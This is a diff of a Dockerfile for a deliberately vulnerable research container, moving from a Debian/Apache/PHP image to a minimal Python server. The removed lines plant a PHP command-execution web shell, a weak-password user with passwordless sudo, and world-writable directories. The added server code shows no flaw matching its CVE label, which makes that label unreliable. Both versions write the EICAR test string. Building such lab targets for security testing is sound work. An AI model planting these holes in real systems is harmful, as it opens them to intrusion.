@@ -1,51 +1,41 @@
-FROM debian:12.1
-LABEL maintainer="you@example.com"
-LABEL org.opencontainers.image.description="Vulnerable Debian 12.1 image with known CVEs - FOR RESEARCH ONLY"
+FROM python:3.12-slim-bullseye
+LABEL maintainer="research@example.com"
+LABEL org.opencontainers.image.description="Vulnerable image with CVE-2024-0450 - FOR RESEARCH ONLY"
 
 ENV DEBIAN_FRONTEND=noninteractive
 
-# Install vulnerable packages
+# Install base packages
 RUN apt-get update && apt-get install -y \
     apache2 \
-    php8.2 \
-    mariadb-client \
     curl \
     wget \
-    openssh-server \
-    python3 \
     gcc \
-    sudo \
     --no-install-recommends
 
-# Create vulnerable user configuration
-RUN useradd -ms /bin/bash insecureuser && echo "insecureuser:password123" | chpasswd
-RUN usermod -aG sudo insecureuser
-RUN echo "insecureuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+# Create a vulnerable Python server (CVE-2024-0450)
+WORKDIR /app
+COPY vulnerable-app /app
 
-# Set up vulnerable Apache configuration
-RUN echo '<VirtualHost *:80> \
-    DocumentRoot "/var/www/html" \
-    ServerSignature On \
-    ServerTokens Full \
-    <Directory "/var/www/html"> \
-        AllowOverride All \
-        Options Indexes FollowSymLinks \
-        Require all granted \
-    </Directory> \
-</VirtualHost>' > /etc/apache2/sites-available/000-default.conf
+# Create vulnerable Python server code
+RUN echo 'from http.server import HTTPServer, BaseHTTPRequestHandler\n\
+class VulnerableHandler(BaseHTTPRequestHandler):\n\
+    def do_GET(self):\n\
+        self.send_response(200)\n\
+        self.send_header("Content-type", "text/html")\n\
+        self.end_headers()\n\
+        self.wfile.write(b"Vulnerable Server")\n\
+\n\
+def run(server_class=HTTPServer, handler_class=VulnerableHandler):\n\
+    server_address = ("", 8000)\n\
+    httpd = server_class(server_address, handler_class)\n\
+    httpd.serve_forever()\n\
+\n\
+if __name__ == "__main__":\n\
+    run()' > server.py
 
-# Create test files for vulnerability scanning
-RUN echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > /var/www/html/shell.php
-RUN echo '<?php phpinfo(); ?>' > /var/www/html/info.php
-
-# Set insecure permissions
-RUN chmod -R 777 /var/www/html
-RUN chmod -R 777 /etc/apache2
-
-# Add EICAR test file
-WORKDIR /opt/malware-test
+# Create test malware simulation
 RUN echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > eicar.com
 
-EXPOSE 80 22 3306
+EXPOSE 8000 80
 
-CMD ["/bin/bash", "-c", "service apache2 start && tail -f /dev/null"]
+CMD ["python3", "server.py"]
